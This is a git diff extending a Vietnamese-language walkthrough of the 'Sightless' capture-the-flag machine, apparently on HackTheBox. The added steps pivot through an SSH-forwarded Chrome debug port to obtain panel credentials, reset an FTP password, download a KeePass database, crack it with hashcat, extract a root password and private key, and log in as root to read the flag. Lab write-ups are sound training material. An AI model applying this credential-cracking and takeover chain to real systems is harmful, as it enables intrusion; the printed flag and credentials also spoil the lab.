@@ -1,4 +1,4 @@
-<img width="1871" height="958" alt="image" src="https://github.com/user-attachments/assets/54d7ceaa-98a8-4405-bae1-63142e4bbc07" /># Sightless
+# Sightless
 
 <img width="1352" height="619" alt="image" src="https://github.com/user-attachments/assets/2387c060-ce30-4d25-9dcc-c7a1f5dd79d5" />
 
@@ -140,26 +140,130 @@ Xóa phần `https://demo.froxlor.org` đi và có thể thay bằng `http://adm
 
 Sau đó bắt request burp suite login lại và thay thế payload vào phần username:
 
-![Uploading image.png…]()
+<img width="1786" height="337" alt="image" src="https://github.com/user-attachments/assets/14ab8d72-287c-49a4-a9e8-a7b578b6f0a8" />
 
 Đợi 1 lúc thì đăng nhập với cred `abcd:Abcd@@1234`:
 
 <img width="1854" height="905" alt="image" src="https://github.com/user-attachments/assets/1e311d8a-3ba6-4de0-82d1-7da79ddf3cee" />
 
+Có 1 cách khác là nối port `45807` và sử dụng bằng `ssh -L 8082:localhost:45807 michael@10.10.11.32`, sau đó sử dụng `chrome://inspect` 
 
+<img width="1164" height="576" alt="image" src="https://github.com/user-attachments/assets/4df8e337-9bf5-401e-b5bb-a9247cf0c378" />
 
+Sau đó sẽ có được cred của admin là `admin:ForlorfroxAdmin`:
 
+<img width="1845" height="872" alt="image" src="https://github.com/user-attachments/assets/bd5c029d-498f-41d5-a1be-e7a68ab84536" />
 
+Để ý thì thấy có username `web1` đã dùng ftp với dung lượng là `31.00 KB` 
 
+<img width="1850" height="911" alt="image" src="https://github.com/user-attachments/assets/69ea1f41-0a9c-449f-a69e-f3ea108265d1" />
 
+Nhớ lại thì khi dùng nmap để quét có xuất hiện port 21 là dịch vụ ftp, truy cập vào tài khoản của `web1` và sửa lại mật khẩu trong ftp là `DkaeouOsgq`:
 
+<img width="1870" height="877" alt="image" src="https://github.com/user-attachments/assets/cc1dc740-d0f9-485e-b30b-acd626e9f220" />
 
+Tôi kết nối vào với mật khẩu mới, lấy được file `Database.kdb`
 
+```
+❯ lftp -u web1,DkaeouOsgq 10.10.11.32
+lftp web1@10.10.11.32:~> set ssl:verify-certificate no
+lftp web1@10.10.11.32:~> ls
+ls: Login failed: 530 Login incorrect.
+lftp web1@10.10.11.32:~> 
+lftp web1@10.10.11.32:~> exit
+❯ lftp -u web1,DkaeouOsgq 10.10.11.32
+lftp web1@10.10.11.32:~> set ssl:verify-certificate no
+lftp web1@10.10.11.32:~> ls
+drwxr-xr-x   3 web1     web1         4096 May 17  2024 goaccess
+-rw-r--r--   1 web1     web1         8376 Mar 29  2024 index.html
+lftp web1@10.10.11.32:/> ls goaccess/
+drwxr-xr-x   2 web1     web1         4096 Aug  2  2024 backup
+lftp web1@10.10.11.32:/> ls goaccess/backup/
+-rw-r--r--   1 web1     web1         5292 Aug  6  2024 Database.kdb
+lftp web1@10.10.11.32:/> ls goaccess/backup/Database.kdb 
+-rw-r--r--   1 web1     web1         5292 Aug  6  2024 goaccess/backup/Database.kdb
+lftp web1@10.10.11.32:/> get goaccess/backup/Database.kdb 
+5292 bytes transferred                                              
+lftp web1@10.10.11.32:/>
+```
 
+Đây là file Keepass:
 
+```
+❯ file Database.kdb
+Database.kdb: Keepass password database 1.x KDB, 8 groups, 4 entries, 600000 key transformation rounds
+```
 
+Và nó đòi mật khẩu để truy cập:
 
+<img width="669" height="343" alt="image" src="https://github.com/user-attachments/assets/149e4762-3a1c-4c91-8c52-c74a87238c2e" />
 
+Tôi dùng `keepass2john Database.kdb > ~/hashcat/hash.txt` để cho vào file `hash.txt` sau đó dùng `hashcat -m 13400 ~/hashcat/hash.txt ~/wordlist/rockyou.txt`
+
+Sau 1 lúc thì ra được mật khẩu là `bulldogs`
+
+```
+❯ kpcli Database.kdb
+WARNING: A KeePassX-style lock file is in place for this file.
+         It may be opened elsewhere. Be careful of saving!
+Provide the master password: *************************
+
+KeePass CLI (kpcli) v4.1.2 is ready for operation.
+Type 'help' for a description of available commands.
+Type 'help <command>' for details on individual commands.
+
+kpcli:/> ls
+=== Groups ===
+General/
+kpcli:/> cd General/
+kpcli:/General> cd sightless.htb/
+kpcli:/General/sightless.htb> cd Backup/
+kpcli:/General/sightless.htb/Backup> ls
+=== Entries ===
+0. ssh                                                                    
+kpcli:/General/sightless.htb/Backup> show ssh
+
+Title: ssh
+Uname: root
+ Pass: q6gnLTB74L132TMdFCpK
+  URL: 
+Notes: 
+Atchm: id_rsa (3428 bytes)
+
+kpcli:/General/sightless.htb/Backup> attach ssh
+Atchm: id_rsa (3428 bytes)
+Choose: (a)dd/(e)xport/(d)elete/(c)ancel/(F)inish? 
+Path to file: /home/namdeptrai/road_to_hecker
+WARNING: file already exists: /home/namdeptrai/road_to_hecker/id_rsa
+Overwrite it? [y/N] 
+Saved to: /home/namdeptrai/road_to_hecker/id_rsa
+Atchm: id_rsa (3428 bytes)
+Choose: (a)dd/(e)xport/(d)elete/(c)ancel/(F)inish? 
+kpcli:/General/sightless.htb/Backup> 
+```
+
+File `id_rsa` sau khi tải về thì ở cuối thiếu dấu xuống dòng và phải dùng `dos2unix` để convert sang Unix format, từ đó mới sử dụng để ssh được:
+
+```
+❯ dos2unix id_rsa
+dos2unix: converting file id_rsa to Unix format...
+❯ tail id_rsa
+uVmkDYBHxpjscG0Z11ngNu89YhWmDZfu38sfEcV828cHUW2JJJ/WibCCzGRhG4K1gLTghL
+L+/cNo97CK/6XHaEhEOHE5ZWvNR6SaiGzhUQzmz9PIGRlLX7oSvNyanH2QORwocFF0z1Aj
++6dwxnESdflQcAAAEBAPG196zSYV4oO75vQzy8UFpF4SeKBggjrQRoY0ExIIDrSbJjKavS
+0xeH/JTql1ApcPCOL4dEf3nkVqgui5/2rQqz901p3s8HGoAiD2SS1xNBQi6FrtMTRIRcgr
+46UchOtoTP0wPIliHohFKDIkXoglLtr8QBNBS7SEI+zTzlPVYZNw8w0fqcCh3xfjjy/DNm
+9KlxLdjvS21nQS9N82ejLZNHzknUb1fohTvnnKpEoFCWOhmIsWB9NhFf7GQV1lUXdcRy1f
+ojHlAvysf4a4xuX72CXMyRfVGXTtK3L18SZksdrg0CAKgxnMGWNkgD6I/M+EwSJQmgsLPK
+tLfOAdSsE7MAAAASam9obkBzaWdodGxlc3MuaHRiAQ==
+-----END OPENSSH PRIVATE KEY-----
+
+❯ ssh -i id_rsa root@10.10.11.32
+Last login: Tue Sep  9 14:53:13 2025 from 10.10.14.32
+root@sightless:~# cat root.txt 
+c8b39c579d5ed6e9a81f1fb1f238e7fb
+root@sightless:~# 
+```
 
 
 
